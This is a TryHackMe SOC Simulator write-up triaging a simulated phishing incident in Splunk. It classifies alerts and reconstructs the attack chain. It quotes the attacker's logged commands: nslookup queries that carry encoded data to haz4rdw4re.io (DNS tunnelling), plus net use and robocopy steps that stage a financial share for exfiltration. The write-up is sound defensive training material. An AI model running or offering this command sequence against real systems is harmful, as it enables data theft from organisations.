# Phishing Unfolding 

**Difficulty:** Medium  
**Platform:** TryHackMe SOC Simulator  
**SIEM Tool Used:** Splunk  

---

## Overview


This scenario simulates a real-world phishing attack progressing through a corporate environment. As a SOC analyst, I was assigned 34 alerts generated across email, process, and execution data sources. My task was to triage each alert, classify it as a **True Positive ** or **False Positive **, investigate suspicious events using Splunk, and escalate confirmed threats with detailed case reports.

---

## Alert Summary

| Metric | Value |
|---|---|
| Total Alerts Closed | 34 |
| Mean Time to Resolve (MTTR) | 3 minutes |
| Mean Dwell Time | 29 minutes |
| True Positive Identification Rate | 100% ✅ |
| False Positive Identification Rate | 58% ⚠️ |
| Overall Classification Accuracy | 63.89% |

---

## Alert Analysis

### TRUE POSITIVES

---

#### Alert #1 — Suspicious Inbound Phishing Email
**Rule:** Suspicious email from external domain  
**Type:** Phishing | **Severity:** Low  
**Timestamp:** 06/08/2026 22:09:12.803

<div align="center">
  <img src="https://github.com/emmagh8/Assets/blob/main/SOC_L1/Writeup4/Capturexx11.PNG?raw=true">
</div>


**Analysis:**  
The email was sent from a suspicious external domain (`.xyz` TLD), with no attachment but highly persuasive, unsolicited content using classic social engineering language. The subject line and body both contain exaggerated promises designed to manipulate the recipient into clicking a link.

**Classification:** ✅ True Positive  
**Reason:** Suspicious inbound email containing social engineering indicators, including exaggerated promises, unsolicited business opportunities, and persuasive language intended to influence user behavior. Classified as phishing/spam.

---

#### Alert #2 — Suspicious Parent-Child Relationship (nslookup via PowerShell) — #1028
**Rule:** Suspicious Parent Child Relationship  
**Type:** Process | **Severity:** High  
**Timestamp:** 06/08/2026 22:39:40.803

**Event Details (from Splunk / Sysmon):**
- **Datasource:** sysmon
- **Host:** win-3450
- **Process:** `nslookup.exe` (PID 3700)
- **Parent Process:** `powershell.exe` (PID 3728)
- **Command Line:** `"C:\Windows\system32\nslookup.exe" VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io`
- **Working Directory:** `C:\Users\michael.ascot\downloads\`

**Analysis:**  
PowerShell spawning `nslookup.exe` with a long Base64-like encoded subdomain querying `haz4rdw4re.io` is a strong indicator of **DNS tunneling** or **C2 (Command and Control) beacon activity**. The working directory in the user's Downloads folder, combined with the suspicious domain, confirms malicious intent.

**Classification:** ✅ True Positive  
**Affected Entities:** Host: win-3450, User: michael.ascot  
**Reason for Escalation:** Potential DNS tunneling or data exfiltration behavior via PowerShell → nslookup process chain.  
**Recommended Actions:**
- Isolate host win-3450 from the network
- Block domain `haz4rdw4re.io` at DNS and proxy level

**Attack Indicators:**
- Suspicious command string: `VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm`
- Execution from: `C:\Users\michael.ascot\downloads\`

---

#### Alert #3 — Suspicious Parent-Child Relationship (nslookup via PowerShell) — #1028 (2nd instance)
**Rule:** Suspicious Parent Child Relationship  
**Type:** Process | **Severity:** High  
**Timestamp:** 06/08/2026 22:39:37.803

**Event Details:**
- **Host:** win-3450
- **Process:** `nslookup.exe` (PID 3800)
- **Parent Process:** `powershell.exe` (PID 3728)
- **Command Line:** `"C:\Windows\system32\nslookup.exe" nLz8nMDy7NzU0sqtSryCmu4OVyprsk.haz4rdw4re.io`
- **Working Directory:** `C:\Users\michael.ascot\downloads\exfiltration\`

**Analysis:**  
A second DNS tunneling event, this time with a different encoded subdomain but the same malicious domain `haz4rdw4re.io`. The working directory has changed to a folder explicitly named **"exfiltration"** — a very clear indicator of data staging.

**Classification:** ✅ True Positive  
**Reason for Escalation:** Second DNS tunneling attempt; working directory named "exfiltration" strongly suggests active data exfiltration campaign.  
**Attack Indicators:**
- Command string: `nLz8nMDy7NzU0sqtSryCmu4OVyprsk.haz4rdw4re.io`
- Execution from: `C:\Users\michael.ascot\downloads\exfiltration\`

---

#### Alert #4 — Network Drive Mapped to Local Drive — #1022
**Rule:** Network drive mapped to a local drive  
**Type:** Execution | **Severity:** Medium  
**Timestamp:** 06/08/2026 22:37:52.803

**Event Details (from Sysmon):**
- **Host:** win-3450
- **Process:** `net.exe` (PID 5784)
- **Parent Process:** `powershell.exe` (PID 3728)
- **Command Line:** `"C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords`
- **Working Directory:** `C:\Users\michael.ascot\downloads\`

**Related Event (cleanup):**
- **Timestamp:** 06/08/2026 22:38:37.803
- **Command:** `"C:\Windows\system32\net.exe" use Z: /delete`

**Analysis:**  
PowerShell executed `net.exe` to map a network share (`\\FILESRV-01\SSF-FinancialRecords`) to drive `Z:`. This targets a **sensitive financial records share**. The mapping was then deleted (anti-forensic cleanup). The entire operation originates from a non-standard working directory (Downloads), strongly suggesting scripted, malicious activity.

**Classification:** ✅ True Positive  
**Affected Entities:** Host: win-3450, User: michael.ascot, Target Share: `\\FILESRV-01\SSF-FinancialRecords`  
**Reason for Escalation:** PowerShell-initiated access to a sensitive financial file share from a non-standard directory, followed by immediate cleanup — indicative of scripted unauthorized data access.  
**Recommended Actions:**
- Validate with system administrator if network mapping was authorized
- Review PowerShell execution history for michael.ascot
- Review access logs for the Z:\ network share

---

#### Alert #5 — Suspicious Parent-Child Relationship (Robocopy) — #1023
**Rule:** Suspicious Parent Child Relationship  
**Type:** Process | **Severity:** Low  
**Timestamp:** 06/08/2026 22:38:39.803

**Event Details (from Sysmon):**
- **Host:** win-3450
- **Process:** `Robocopy.exe` (PID 8356)
- **Parent Process:** `powershell.exe` (PID 3728)
- **Command Line:** `"C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\downloads\exfiltration /E`
- **Working Directory:** `Z:\`

**Analysis:**  
Immediately after mapping the financial records share to `Z:\`, `Robocopy.exe` was used to recursively copy (`/E`) all contents of the network drive into a local folder named **"exfiltration"**. This is a textbook **data staging for exfiltration** technique.

**Classification:** ✅ True Positive  
**Affected Entities:** Host: win-3450, User: michael.ascot  
**Reason for Escalation:** Potential data exfiltration — recursive copying from a network financial share to a local staging folder named "exfiltration."  
**Recommended Actions:**
- Immediately isolate host win-3450 from the network
- Investigate PowerShell execution history for michael.ascot
- Review Z:\ network share access logs
- Identify files copied into `C:\Users\*\Downloads\exfiltration`
- Block further access to affected file shares
- Conduct forensic analysis of endpoint

**Attack Indicators:**
- Process: `Robocopy.exe`
- Parent process: `powershell.exe`
- Source: `Z:\` (mapped financial network drive)
- Destination folder: `exfiltration`
- Switch: `/E` (recursive copy)
- Staging directory in user Downloads folder

---

### ❌ FALSE POSITIVES

---

#### FP #1 — TrustedInstaller.exe
**Timestamp:** 06/08/2026 22:06:30.803

**Event Details:**
- **Host:** win-3459
- **Process:** `TrustedInstaller.exe` (PID 3577)
- **Parent Process:** `services.exe` (PID 3506)
- **Path:** `C:\Windows\servicing\TrustedInstaller.exe`
- **Working Directory:** `C:\Windows\system32\`

**Analysis:**  
`TrustedInstaller.exe` is a legitimate Windows component responsible for installing Windows updates and protected system files. It is running from its expected path (`C:\Windows\servicing\`) and launched by `services.exe`, which is the standard parent process. No anomalies detected.

**Classification:** ❌ False Positive — Benign activity

---

#### FP #2 — taskhostw.exe
**Timestamp:** 06/08/2026 22:16:16.803

**Event Details:**
- **Host:** win-3451
- **Process:** `taskhostw.exe` (PID 3945)
- **Parent Process:** `svchost.exe` (PID 3652)
- **Command Line:** `taskhostw.exe KEYROAMING`
- **Path:** `C:\Windows\system32\taskhostw.exe`

**Analysis:**  
`taskhostw.exe` is a valid Windows host process for task management. Running from `C:\Windows\system32\` and launched by `svchost.exe` is completely normal behavior. The `KEYROAMING` argument is associated with credential roaming tasks in Windows.

**Classification:** ❌ False Positive — Benign activity

---

#### FP #3 — WUDFHost.exe
**Timestamp:** 06/08/2026 22:22:12.803

**Event Details:**
- **Host:** win-3455
- **Process:** `WUDFHost.exe` (PID 3710)
- **Parent Process:** `services.exe` (PID 3817)
- **Path:** `C:\Windows\System32\WUDFHost.exe`
- **Command Line:** Contains standard UMDF communication port GUIDs

**Analysis:**  
`WUDFHost.exe` (Windows User-Mode Driver Framework Host) is a legitimate Windows system process for managing user-mode device drivers. The lengthy command line with GUIDs represents standard UMDF port communication parameters. Running from `system32` under `services.exe` is expected behavior.

**Classification:** ❌ False Positive — Benign activity

---

## 🔗 Attack Chain Reconstruction

```
[Initial Access]
Phishing email → yani.zubair@tryhatme.com
  └─ Sender: leonard@fashionindustrytrends.xyz
  └─ Social engineering content (no attachment)

         ↓

[Execution — Host: win-3450, User: michael.ascot]
powershell.exe (PID 3728) — malicious PowerShell script
  │
  ├─► nslookup.exe → VEhNez....haz4rdw4re.io   [DNS Tunneling / C2]
  ├─► nslookup.exe → nLz8nMD...haz4rdw4re.io   [DNS Tunneling / C2]
  ├─► net.exe use Z: \\FILESRV-01\SSF-FinancialRecords  [Lateral Movement / Discovery]
  ├─► robocopy.exe Z:\ → downloads\exfiltration /E      [Data Staging]
  └─► net.exe use Z: /delete                             [Anti-forensic Cleanup]

         ↓

[Exfiltration]
Data staged locally at C:\Users\michael.ascot\downloads\exfiltration\
DNS tunneling channel open via haz4rdw4re.io
```

---

## 📊 Performance Results

| Category | Rate |
|---|---|
| True Positive Identification | ✅ 100% |
| False Positive Identification | ⚠️ 58% |
| Overall Accuracy | 63.89% |
| Closed Alerts | 34 |
| Mean Time to Resolve | 3 minutes |
| Mean Dwell Time | 29 minutes |
| Final Score | 1310 pts (+1285 pts) |

**Areas for Improvement:**
- False positive rate was 58% — several phishing alerts (IDs 1000, 1003, 1013, 1014, 1017, 1018) were incorrectly classified. These likely involved legitimate marketing emails that share surface-level characteristics with phishing but lack the full attack chain indicators.
- Dwell time of 29 minutes suggests the attack was active for a significant period before all indicators were correlated and escalated.

---

## 🧠 Key Takeaways

1. **Context matters in phishing triage** — not every email from an external domain is malicious. Look for combinations of suspicious TLD + social engineering language + urgency cues before classifying as TP.

2. **Process chain analysis is critical** — the entire attack on win-3450 was rooted in a single `powershell.exe` process (PID 3728). Pivoting on parent PIDs in Splunk/Sysmon revealed the full kill chain.

3. **Naming conventions reveal intent** — the attacker explicitly named a staging folder "exfiltration." Adversaries are not always subtle; anomalous directory names are high-value indicators.

4. **DNS tunneling detection** — long encoded subdomains queried via `nslookup.exe` spawned by `powershell.exe` is a red flag. Always check the full command line, not just the process name.

5. **Anti-forensic behavior** — the immediate deletion of the mapped network drive (`net use Z: /delete`) after copying data is a sign of a skilled attacker attempting to cover their tracks.

6. **Legitimate Windows processes can generate false alerts** — `TrustedInstaller.exe`, `taskhostw.exe`, and `WUDFHost.exe` are all valid system processes. Always verify the parent process, execution path, and working directory before escalating.

---

## 🛠️ Tools Used

- **TryHackMe SOC Simulator**
- **Splunk** (SIEM — log analysis and event correlation)
- **Sysmon** (data source for process telemetry)

---

*Writeup by Imenghdiri | TryHackMe SOC Simulator — Phishing Unfolding*
